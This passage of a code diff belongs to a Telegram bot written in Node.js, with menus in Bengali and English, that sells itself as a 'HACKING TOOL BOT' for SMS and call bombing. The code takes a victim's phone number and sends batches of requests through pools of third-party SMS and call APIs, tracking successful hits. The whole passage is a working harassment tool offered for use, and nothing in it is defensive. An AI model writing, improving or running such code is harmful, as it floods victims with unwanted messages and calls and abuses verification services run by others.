-        if (delayMs) await sleep(delayMs);
+            if (r.ok) result.hits++;
+            else result.fails++;
+        });
+        
+        if (onProgress) onProgress(result.sent, targetList.length);
+        await sleep(500); // slight delay between batches
     }
+    
     result.elapsed = Date.now() - start;
     return result;
 }
 
 // ── Keyboards ──
-const backKb = { inline_keyboard: [[{ text: '◀️ Menu', callback_data: 'M_BACK' }]] };
-function mainKb(uid) {
-    const kb = [
-        [{ text: '📨 SMS Bomber',  callback_data: 'BOMB_SMS'  }, { text: '📞 Call Bomber', callback_data: 'BOMB_CALL' }],
-        [{ text: '💰 My Wallet',   callback_data: 'BALANCE'   }, { text: '📊 Pool Stats',  callback_data: 'POOL'      }],
-        [{ text: '🔗 Referral',    callback_data: 'REFERRAL'  }, { text: '❓ How To Use',  callback_data: 'HOW_TO'    }],
-    ];
-    if (isAdmin(uid)) kb.push([{ text: '👑 Admin Panel', callback_data: 'ADMIN' }]);
-    return { inline_keyboard: kb };
-}
+const backKb = { inline_keyboard: [[{ text: '◀️ মেইন মেনু', callback_data: 'M_BACK' }]] };
+const mainKb = { inline_keyboard: [
+    [{ text: '📨 SMS Bomber', callback_data: 'BOMB_SMS' }, { text: '📞 Call Bomber', callback_data: 'BOMB_CALL' }],
+]};
 
-// ── /start ──
-bot.onText(/\/start(?:\s+(.+))?/, async msg => {
+// ── Handlers ──
+bot.onText(/\/start/, async msg => {
     const cid = String(msg.chat.id);
-    const name = msg.from.first_name || 'বন্ধু';
-    const u = getUser(cid);
-    if (u.banned) return tgMsg(cid, '⛔ You are banned.');
+    if (getUser(cid).banned) return tgMsg(cid, '⛔ আপনি ব্যানড হয়েছেন।');
 
-    const refArg = (msg.text.split(' ')[1] || '').trim();
-    if (refArg && refArg !== cid && store.users[refArg]) {
-        const ref = store.users[refArg];
-        if (!ref.banned) {
-            ref.refs = (ref.refs || 0) + 1;
-            ref.balance = (ref.balance || 0) + CFG.REF_REWARD;
-            if (ref.refs >= CFG.FREE_REFS) ref.lifetime = true;
-            saveStore();
-            tgMsg(refArg, `🎉 <b>New Referral!</b>\n💰 +${CFG.REF_REWARD} tokens\n🏆 Total: <b>${ref.refs}/${CFG.FREE_REFS}</b>${ref.lifetime ? '\n♾️ <b>Lifetime Free Unlocked!</b>' : ''}`);
-        }
-    }
+    await tgMsg(cid, `
+┌─────────────────────────────┐
+│  💀 <b>HACKING TOOL BOT</b> 💀  │
+└─────────────────────────────┘
 
-    await tgMsg(cid,
-`🔥 <b>স্বাগতম, ${name}</b> 🔥
+এই বট দিয়ে আপনি <b>যেকোনো নাম্বারে আনলিমিটেড</b> SMS এবং Call বোম্বিং করতে পারবেন। 
 
-┌───────────────────────────┐
-│  💣 <b>SMS + CALL BOMBER</b>  │
-└───────────────────────────┘
+⚡ <b>আমাদের ডাটাবেসে ৪০০+ এপিআই যুক্ত আছে!</b>
 
-🎯 <b>Tools:</b>
-├ 📨 SMS Bomber
-└ 📞 Call Bomber
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━
-🎁 <b>Signup Bonus: +${CFG.SIGNUP_BONUS} tokens</b>
-💰 <b>Cost: ${CFG.BOMB_COST} tokens/bomb</b>
-━━━━━━━━━━━━━━━━━━━━━━━━━━
-
-💡 Refer <b>${CFG.FREE_REFS}</b> friends → ♾️ Lifetime Free
-
-👇 Tap below to start:`,
-        { reply_markup: mainKb(cid) });
+👇 নিচের মেনু থেকে আপনার পছন্দের মেনুটা সিলেক্ট করুন।
+`, { reply_markup: mainKb });
 });
 
 bot.onText(/\/menu/, async msg => {
-    const cid = String(msg.chat.id);
-    if (getUser(cid).banned) return;
-    tgMsg(cid, '💣 <b>Main Menu</b>', { reply_markup: mainKb(cid) });
+    if (getUser(msg.chat.id).banned) return;
+    tgMsg(msg.chat.id, '👇 মেনু সিলেক্ট করুন:', { reply_markup: mainKb });
 });
 
-// ── Admin commands ──
-bot.onText(/\/addvip\s+(\d+)/, async msg => {
-    if (!isAdmin(msg.chat.id)) return;
-    const tid = msg.text.split(' ')[1];
-    store.vip[tid] = true;
-    getUser(tid).lifetime = true;
-    saveStore();
-    tgMsg(msg.chat.id, `👑 VIP granted: <code>${tid}</code>`);
-    tgMsg(tid, '♾️ <b>Lifetime Free Access granted!</b>').catch(()=>{});
-});
-bot.onText(/\/removevip\s+(\d+)/, async msg => {
-    if (!isAdmin(msg.chat.id)) return;
-    const tid = msg.text.split(' ')[1];
-    delete store.vip[tid];
-    if (store.users[tid]) store.users[tid].lifetime = false;
-    saveStore();
-    tgMsg(msg.chat.id, `🗑️ VIP removed: <code>${tid}</code>`);
-});
+// Admin commands
 bot.onText(/\/ban\s+(\d+)/, async msg => {
     if (!isAdmin(msg.chat.id)) return;
     getUser(msg.text.split(' ')[1]).banned = true;
-    saveStore();
-    tgMsg(msg.chat.id, `🔨 Banned: <code>${msg.text.split(' ')[1]}</code>`);
+    saveStore(); tgMsg(msg.chat.id, `🔨 Banned: <code>${msg.text.split(' ')[1]}</code>`);
 });
 bot.onText(/\/unban\s+(\d+)/, async msg => {
     if (!isAdmin(msg.chat.id)) return;
     getUser(msg.text.split(' ')[1]).banned = false;
-    saveStore();
-    tgMsg(msg.chat.id, `✅ Unbanned: <code>${msg.text.split(' ')[1]}</code>`);
-});
-bot.onText(/\/addbal\s+(\d+)\s+(\d+)/, async msg => {
-    if (!isAdmin(msg.chat.id)) return;
-    const [, tid, amt] = msg.text.split(' ');
-    getUser(tid).balance = (getUser(tid).balance || 0) + parseInt(amt);
-    saveStore();
-    tgMsg(msg.chat.id, `💰 +${amt} → <code>${tid}</code>`);
+    saveStore(); tgMsg(msg.chat.id, `✅ Unbanned: <code>${msg.text.split(' ')[1]}</code>`);
 });
 bot.onText(/\/stats/, async msg => {
     if (!isAdmin(msg.chat.id)) return;
-    const mem = process.memoryUsage();
-    tgMsg(msg.chat.id,
-`📊 <b>Stats</b>
-👥 Users: <b>${Object.keys(store.users).length}</b>
-👑 VIP: <b>${Object.keys(store.vip).length}</b>
-📨 Pool SMS: <b>${POOL.sms.length}</b>
-📞 Pool Call: <b>${POOL.call.length}</b>
-💾 Mem: <b>${Math.round(mem.heapUsed/1024/1024)}MB</b>
-⏱️ Uptime: <b>${Math.floor(process.uptime()/60)}m</b>`);
-});
-bot.onText(/\/broadcast\s+(.+)/s, async msg => {
-    if (!isAdmin(msg.chat.id)) return;
-    const text = msg.text.replace('/broadcast ', '').trim();
-    let sent = 0, failed = 0;
-    for (const uid of Object.keys(store.users)) {
-        if (store.users[uid].banned) continue;
-        try { await tgMsg(uid, `📢 <b>Announcement</b>\n\n${text}`); sent++; } catch { failed++; }
-    }
-    tgMsg(msg.chat.id, `📢 Sent: ✅ ${sent} | ❌ ${failed}`);
-});
-bot.onText(/\/reload/, async msg => {
-    if (!isAdmin(msg.chat.id)) return;
-    loadPool();
-    tgMsg(msg.chat.id, `🔄 Pool reloaded: S=${POOL.sms.length} C=${POOL.call.length}`);
-});
-bot.onText(/\/probe(?:\s+(\S+))?/, async msg => {
-    if (!isAdmin(msg.chat.id)) return;
-    const phone = (msg.text.split(' ')[1] || '').trim();
-    if (!phone) return tgMsg(msg.chat.id, '❌ Usage: <code>/probe +8801712345678</code>');
-    const phoneClean = phone.replace(/^\+/, '');
-    const status = await tgMsg(msg.chat.id, `🔍 Probing ${SEED.length} endpoints with +${phoneClean}...`);
-    try {
-        const result = await runProbe(phoneClean);
-        if (status) bot.deleteMessage(msg.chat.id, status.message_id).catch(()=>{});
-        tgMsg(msg.chat.id,
-`✅ <b>Probe Done</b>
-
-📨 Live: <b>${result.working}</b>
-❌ Dead: <b>${result.dead}</b>
-📊 Pool SMS now: <b>${result.total}</b>
-
-${result.working > 0 ? '🟢 Ready to bomb!' : '🔴 No live endpoints. Try different phone or update SEED.'}`);
-    } catch (e) {
-        tgMsg(msg.chat.id, `❌ Probe error: ${e.message}`);
-    }
+    tgMsg(msg.chat.id, `📊 <b>Stats</b>\n👥 Users: <b>${Object.keys(store.users).length}</b>\n📨 SMS APIs: <b>${SMS_POOL.length}</b>\n📞 Call APIs: <b>${CALL_POOL.length}</b>`);
 });
 
-// ── Callbacks ──
+// Callback Handler
 bot.on('callback_query', async cbq => {
     const uid = String(cbq.from.id), chatId = cbq.message.chat.id, msgId = cbq.message.message_id;
     const data = cbq.data;
     if (!checkRate(uid)) return bot.answerCallbackQuery(cbq.id, { text: '⚠️ Slow down!', show_alert: true }).catch(()=>{});
     bot.answerCallbackQuery(cbq.id).catch(()=>{});
     const del = () => bot.deleteMessage(chatId, msgId).catch(()=>{});
-    const u = getUser(uid);
-    if (u.banned) return;
+    if (getUser(uid).banned) return;
 
     try {
-        if (data === 'M_BACK') { del(); delPending(uid); return tgMsg(chatId, '💣 <b>Main Menu</b>', { reply_markup: mainKb(uid) }); }
+        if (data === 'M_BACK') { del(); delPending(uid); return tgMsg(chatId, '👇 মেনু সিলেক্ট করুন:', { reply_markup: mainKb }); }
 
         if (data === 'BOMB_SMS' || data === 'BOMB_CALL') {
             const isSms = data === 'BOMB_SMS';
-            if (!u.lifetime && (u.balance || 0) < CFG.BOMB_COST) {
-                del();
-                return tgMsg(chatId, `❌ <b>Insufficient tokens</b>\n💰 ${u.balance || 0} | Need ${CFG.BOMB_COST}`, { reply_markup: { inline_keyboard: [[{ text: '🔗 Referral', callback_data: 'REFERRAL' }], [{ text: '◀️ Menu', callback_data: 'M_BACK' }]] } });
-            }
-            const poolSize = isSms ? POOL.sms.length : POOL.call.length;
-            if (poolSize === 0) {
-                del();
-                return tgMsg(chatId, `⚠️ <b>No endpoints loaded</b>\n\n${isSms ? 'SMS' : 'Call'} pool is empty. Ask admin to run /probe.`, { reply_markup: backKb });
-            }
+            const poolSize = isSms ? SMS_POOL.length : CALL_POOL.length;
+            if (poolSize === 0) { del(); return tgMsg(chatId, '⚠️ এই ক্যাটাগরিতে কোনো এপিআই নেই।', { reply_markup: backKb }); }
+            
             del();
-            setPending(uid, { type: isSms ? 'bomb_sms' : 'bomb_call' });
-            return tgMsg(chatId,
-`${isSms ? '📨' : '📞'} <b>${isSms ? 'SMS' : 'Call'} Bomber</b>
-
-📱 Target number:
-<code>+8801XXXXXXXXX</code>
-
-💡 Format: <code>PHONE [ROUNDS] [DELAY] [HITS]</code>
-   e.g. <code>+8801712345678 10 200 20</code>
-   Default: <code>5 300 10</code>
-
-💰 Cost: <b>${CFG.BOMB_COST} tokens</b>
-📊 Pool: <b>${poolSize}</b> endpoints`,
-                { reply_markup: { inline_keyboard: [[{ text: '❌ Cancel', callback_data: 'M_BACK' }]] } });
+            setPending(uid, { type: isSms ? 'sms' : 'call' });
+            
+            return tgMsg(chatId, `${isSms ? '📨' : '📞'} <b>${isSms ? 'SMS' : 'Call'} বোম্বিং</b>\n\nটার্গেট নাম্বারটি দিন (যেমন: <code>+88017XXXXXXXX</code>):`, 
+                { reply_markup: { inline_keyboard: [[{ text: '❌ বাতিল', callback_data: 'M_BACK' }]] } });
         }
-
-        if (data === 'BALANCE') {
-            del();
-            return tgMsg(chatId,
-`💰 <b>My Wallet</b>
-
-💵 Balance: <b>${u.balance} tokens</b>
-💣 Total bombs: <b>${u.totalBombs || 0}</b>
-👥 Refs: <b>${u.refs || 0}/${CFG.FREE_REFS}</b>
-♾️ Lifetime: <b>${u.lifetime ? '✅ Active' : `❌ (${CFG.FREE_REFS - (u.refs||0)} more)`}</b>`,
-                { reply_markup: backKb });
-        }
-
-        if (data === 'POOL') {
-            del();
-            return tgMsg(chatId,
-`📊 <b>Pool Status</b>
-
-📨 SMS endpoints: <b>${POOL.sms.length}</b>
-📞 Call endpoints: <b>${POOL.call.length}</b>
-
-${POOL.sms.length === 0 ? '⚠️ Admin must run /probe to populate.' : '🟢 Ready to bomb.'}`,
-                { reply_markup: backKb });
-        }
-
-        if (data === 'REFERRAL') {
-            del();
-            const me = await bot.getMe();
-            const ref = `https://t.me/${me.username}?start=${uid}`;
-            return tgMsg(chatId,
-`🔗 <b>Your Referral Link</b>
-
-<code>${ref}</code>
-
-👥 Progress: <b>${u.refs || 0}/${CFG.FREE_REFS}</b>
-💰 +${CFG.REF_REWARD} per referral
-🏆 ${CFG.FREE_REFS} refs → ♾️ Lifetime Free`,
-                { reply_markup: backKb });
-        }
-
-        if (data === 'HOW_TO') {
-            del();
-            return tgMsg(chatId,
-`❓ <b>How To Use</b>
-
-<b>📨 SMS Bomb:</b>
-Tap SMS Bomber → send target number
-
-<b>📞 Call Bomb:</b>
-Tap Call Bomber → send target number
-
-<b>Format:</b> <code>+8801712345678 5 300 10</code>
-• PHONE: target with country code
-• ROUNDS: 1-50 (default 5)
-• DELAY: milliseconds (default 300)
-• HITS: goal count (default 10)
-
-<b>💰 Cost:</b> ${CFG.BOMB_COST} tokens per bomb
-<b>♾️ Free:</b> Refer ${CFG.FREE_REFS} friends`,
-                { reply_markup: backKb });
-        }
-
-        if (data === 'ADMIN') {
-            if (!isAdmin(uid)) return;
-            del();
-            return tgMsg(chatId,
-`👑 <b>Admin Panel</b>
-
-<b>Users:</b> ${Object.keys(store.users).length}
-<b>VIPs:</b> ${Object.keys(store.vip).length}
-<b>SMS pool:</b> ${POOL.sms.length}
-<b>Call pool:</b> ${POOL.call.length}
-
-<b>Commands:</b>
-<code>/probe +8801712345678</code> — populate pool
-<code>/reload</code> — reload from file
-<code>/addvip ID</code> · <code>/removevip ID</code>
-<code>/addbal ID AMT</code>
-<code>/ban ID</code> · <code>/unban ID</code>
-<code>/broadcast msg</code>
-<code>/stats</code>`,
-                { reply_markup: backKb });
-        }
-    } catch (err) {
-        log.error('[CB] ' + err.message);
-        bot.answerCallbackQuery(cbq.id, { text: '⚠️ Error', show_alert: true }).catch(()=>{});
-    }
+    } catch (err) { log.error('[CB] ' + err.message); }
 });
 
-// ── Message handler ──
+// Message Handler
 bot.on('message', async msg => {
     if (!msg.text || msg.text.startsWith('/')) return;
     const uid = String(msg.from.id), text = msg.text.trim();
-    const u = getUser(uid);
-    if (u.banned || !checkRate(uid)) return;
+    if (getUser(uid).banned || !checkRate(uid)) return;
+    
     const pend = getPending(uid);
     if (!pend) return;
     delPending(uid);
 
-    if (pend.type === 'bomb_sms' || pend.type === 'bomb_call') {
-        const isSms = pend.type === 'bomb_sms';
-        const parts = text.split(/\s+/);
-        const phone = parts[0];
-        const rounds = Math.max(1, Math.min(parseInt(parts[1]) || 5,   50));
-        const delay  = Math.max(0, Math.min(parseInt(parts[2]) || 300, 5000));
-        const hits   = Math.max(1, Math.min(parseInt(parts[3]) || 10,  100));
-
-        if (!/^\+?\d{8,15}$/.test(phone.replace(/\s/g, ''))) {
-            return tgMsg(uid, '❌ Invalid number. Format: <code>+8801XXXXXXXXX</code>', { reply_markup: backKb });
+    if (pend.type === 'sms' || pend.type === 'call') {
+        const isSms = pend.type === 'sms';
+        let phone = text.replace(/\s+/g, '');
+        
+        if (!/^\+?\d{10,15}$/.test(phone)) {
+            return tgMsg(uid, '❌ ভুল নাম্বার! সঠিক ফরম্যাট: <code>+88017XXXXXXXX</code>', { reply_markup: backKb });
         }
-        const phoneClean = phone.replace(/\s/g, '').replace(/^\+/, '');
-        if (!u.lifetime) { u.balance = (u.balance || 0) - CFG.BOMB_COST; saveStore(); }
-        u.totalBombs = (u.totalBombs || 0) + 1;
-        saveStore();
-
-        const proc = await tgMsg(uid,
-`${isSms ? '📨' : '📞'} <b>Bombing...</b>
-📱 <code>+${phoneClean}</code>
-⚙️ ${rounds} rounds · ${delay}ms · goal ${hits}`);
-
+        
+        // Strip leading + for API
+        const cleanPhone = phone.replace(/^\+/, '');
+        
+        const proc = await tgMsg(uid, `🚀 <b>বোম্বিং শুরু হচ্ছে...</b>\n\n🎯 টার্গেট: <code>+${cleanPhone}</code>\n⚙️ এপিআই পুল: ${isSms ? SMS_POOL.length : CALL_POOL.length} টি`);
+        
+        let lastEdit = 0;
         try {
-            const result = await bomb(isSms ? 'sms' : 'call', phoneClean, { rounds, delay, hits });
+            const result = await bomb(isSms ? 'sms' : 'call', cleanPhone, (sent, total) => {
+                const now = Date.now();
+                if (now - lastEdit > 2000) {
+                    bot.editMessageText(`🚀 <b>বোম্বিং চলছে...</b>\n\n🎯 টার্গেট: <code>+${cleanPhone}</code>\n📡 প্রসেস: ${sent}/${total}`, { chat_id: uid, message_id: proc.message_id }).catch(()=>{});
+                    lastEdit = now;
+                }
+            });
+
             if (proc) bot.deleteMessage(uid, proc.message_id).catch(()=>{});
+            
             if (result.error) {
-                return tgMsg(uid, `❌ ${result.error}`, { reply_markup: backKb });
+                return tgMsg(uid, `❌ এরর: ${result.error}`, { reply_markup: backKb });
             }
-            tgMsg(uid,
-`✅ <b>Bomb Complete</b>
 
-📱 <code>+${phoneClean}</code>
-✅ Hits: <b>${result.hits}</b> / ${result.sent}
-❌ Fails: ${result.fails}
-⏱️ ${result.elapsed}ms
-
-<b>Last 8:</b>
-${result.log.slice(-8).join('\n') || '—'}`,
+            tgMsg(uid, `✅ <b>বোম্বিং সম্পন্ন!</b>\n\n🎯 টার্গেট: <code>+${cleanPhone}</code>\n📨 টোটাল রিকোয়েস্ট: ${result.sent}\n🟢 সফল হিট: <b>${result.hits}</b>\n🔴 ফেইল: ${result.fails}\n⏱ সময়: ${result.elapsed}ms`, 
                 { reply_markup: { inline_keyboard: [
-                    [{ text: '🔄 Again', callback_data: isSms ? 'BOMB_SMS' : 'BOMB_CALL' }],
-                    [{ text: '◀️ Menu', callback_data: 'M_BACK' }]
+                    [{ text: '🔄 আবার বোম্বিং', callback_data: isSms ? 'BOMB_SMS' : 'BOMB_CALL' }],
+                    [{ text: '◀️ মেইন মেনু', callback_data: 'M_BACK' }]
                 ]}});
-            tgMsg(CFG.ADMIN_ID, `💣 BOMB | <code>${uid}</code> → +${phoneClean}\nHits: ${result.hits}/${result.sent} · ${result.elapsed}ms · ${isSms ? 'SMS' : 'CALL'}`);
+                
+            tgMsg(CFG.ADMIN_ID, `💣 BOMB | <code>${uid}</code> → +${cleanPhone}\nHits: ${result.hits}/${result.sent} · ${result.elapsed}ms · ${isSms ? 'SMS' : 'CALL'}`);
+            
         } catch (e) {
             if (proc) bot.deleteMessage(uid, proc.message_id).catch(()=>{});
-            tgMsg(uid, `❌ Bomb failed: ${e.message}`, { reply_markup: backKb });
+            tgMsg(uid, `❌ সিস্টেম এরর: ${e.message}`, { reply_markup: backKb });
         }
     }
 });
 
-// ── Process guards ──
+// Guards
 process.on('uncaughtException',  err => log.error('[UNCAUGHT] ' + err.message));
-process.on('unhandledRejection', err => log.error('[REJECTION] ' + (err && err.message ? err.message : String(err))));
+process.on('unhandledRejection', err => log.error('[REJECTION] ' + err.message));
 process.on('SIGTERM', () => { saveStore(); process.exit(0); });
 process.on('SIGINT',  () => { saveStore(); process.exit(0); });
 
 log.info(`[Bot] Started — admin=${CFG.ADMIN_ID}`);
-log.info(`[Pool] SMS=${POOL.sms.length} Call=${POOL.call.length}`);
+log.info(`[Pool] SMS=${SMS_POOL.length} Call=${CALL_POOL.length}`);
